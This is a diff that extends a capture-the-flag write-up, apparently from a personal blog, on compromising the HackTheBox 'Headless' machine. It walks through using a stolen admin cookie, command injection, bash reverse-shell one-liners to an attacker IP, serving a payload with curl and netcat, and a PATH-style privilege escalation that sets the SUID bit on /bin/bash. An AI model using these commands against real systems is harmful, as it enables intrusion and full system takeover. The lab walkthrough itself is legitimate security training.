@@ -259,19 +259,98 @@ Note that before sending the request, we must start a web server on Kali:
 sudo python3 -m http.server 8001
 ```
 
-Then, we send the request. It takes some time to get something on our server:
+Then, we send the request. It takes some time to get something back on our server:
 
 <div class="img_container">
 ![admin cookie]({{https://jsom1.github.io/}}/_images/htb_headless_admincookie.png){: height="50px" width = "400px"}
 </div>
 
-And we have an admin cookie. We can take this cookie, go on the */dashboard* page again, and replace our user cookie:
+And we have an admin cookie. Because it is mentionned that this cookie is based64 encoded, we also decoded it. We are now ready to use it on the */dashboard* page. We can simply head there, intercept the request, and modify the cookie as follows:
 
+<div class="img_container">
+![replace cookie]({{https://jsom1.github.io/}}/_images/htb_headless_repl.png){: height="200px" width = "400px"}
+</div>
 
+When we send this request, we finally land on the admin dashboard:
+
+<div class="img_container">
+![admin db]({{https://jsom1.github.io/}}/_images/htb_headless_db.png){: height="200px" width = "400px"}
+</div>
+
+In the "Select Date" field, we can only chose from an existing date, and we cannot enter anything else. Since Burp is still running, let's click on "Generate Report" and look at the request. In the image below, we're trying a working command injection (*ls*):
+
+<div class="img_container">
+![CI POC]({{https://jsom1.github.io/}}/_images/htb_headless_poc.png)
+</div>
+
+The command is URL-encoded, and we see its output in the response. From there, we can execute commands such as *whoami*, *cat*, and so on... We should then be able to get a reverse shell. I tried with the following command:
+
+```
+/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'
+```
+
+But that didn't work (note that my IP changed since the last time I worked on this machine). After looking at the forum for a hint, we're supposed to put this payload into a file and retrieve it with the command injection vulnerability. So, we create a file called "headless_payload.sh", which contains the following code, and make it executable:
+
+```
+bash -i >& /dev/tcp/10.10.14.9/4444 0>&1
+sudo chmod +x headless_payload.sh
+```
+It's a simpler version than the previous, but both should work the same. Then, in the same folder where this file was created, we start a webserver. And finally, in another tab, we start a netcat listener:
+
+```
+sudo python3 -m http.server 8001
+sudo nc -nlvp 4444
+```
+
+Now, we use the command injection vulnerability to *curl* this file on our machine, and then we execute it on the target:
+
+<div class="img_container">
+![revshell burp]({{https://jsom1.github.io/}}/_images/htb_headless_lastburp.png){: height="200px" width = "400px"}
+</div>
+
+The web server logs show a GET request from 10.10.11.8 (*"GET /headless_payload.sh HTTP/1.1" 200*), and we reveive a connexion on our listener:
+
+<div class="img_container">
+![user flag]({{https://jsom1.github.io/}}/_images/htb_headless_usr.png)
+</div>
+
+We're in as *dvir*, and we can get the user flag. And now, we start enumerating once again.
 
 ## 3. Vertical privilege escalation
 {:style="color:DarkRed; font-size: 170%;"}
 
+As usual, let's start by checking this user's permissions:
+
+<div class="img_container">
+![sudol]({{https://jsom1.github.io/}}/_images/htb_headless_sudol.png)
+</div>
+
+This is promising, because we see they can run */usr/bin/syscheck* as the root user. 
+
+<div class="img_container">
+![syscheck]({{https://jsom1.github.io/}}/_images/htb_headless_syscheck.png)
+</div>
+
+The script checks the system status et take actions in consequence. First, it checks that the user who runs it is root (EUID = 0). If this is not the case, the script stops.\\
+Then, it uses the command *find* to search for *vmlinuz* files in the */boot* directory, and it uses *stat* to retrieve the date of the last modification. Then, it formats this date and displays it.\\
+After that, it uses the *df* command to obtain and display the available disk space in the root partition (/).\\
+Then, it uses the *uptime* command to obtain and display the mean charge of the system.\\
+Finally, it uses *pgrep* to check that the database *initdb.sh* is running. If it is not, it tries to start it by executing *./initdb.sh*, supposing that *initdb.sh* is in the same directory as syscheck. And this is where the vulnerability lies; the script tries to execute *initdb.sh* without specifying the absolute path. That means that we can create a malicious *initdb.sh* script and place it in this directory. When the *syscheck* script runs, it will look for the *initdb.sh* script, and find our malicious one. 
+
+The idea is to modify the */bin/bash* binary file permissions. To do that, we use the following command:
+
+```
+chmod u+s /bin/bash
+```
+The *chmod* command modifies the permissions. The *u+s* option specifies that the owner (user) of the file will have execution rights for the file, and these rights will be with the permissions of the file's owner. In other words, this command adds the SUID bit (Set User ID) to the /bin/bash binary. The program will then be executed with the permissions of the file's owner, rather than the permissions of the person who is executing it. Since the usual owner of /bin/bash is root, this is exactly what we want to do... This way, we can bypass the security checks:
+
+<div class="img_container">
+![root]({{https://jsom1.github.io/}}/_images/htb_headless_root.png)
+</div>
+
+<div class="img_container">
+![pwn]({{https://jsom1.github.io/}}/_images/htb_headless_pwn.png)
+</div>
 
 
 <ins>**My thoughts**</ins>
@@ -280,3 +359,4 @@ And we have an admin cookie. We can take this cookie, go on the */dashboard* pag
 
 <ins>**Fix the vulnerabilities**</ins>
 
+l'utilisation de chmod u+s sur des binaires comme /bin/bash est généralement considérée comme dangereuse et doit être évitée dans la plupart des cas
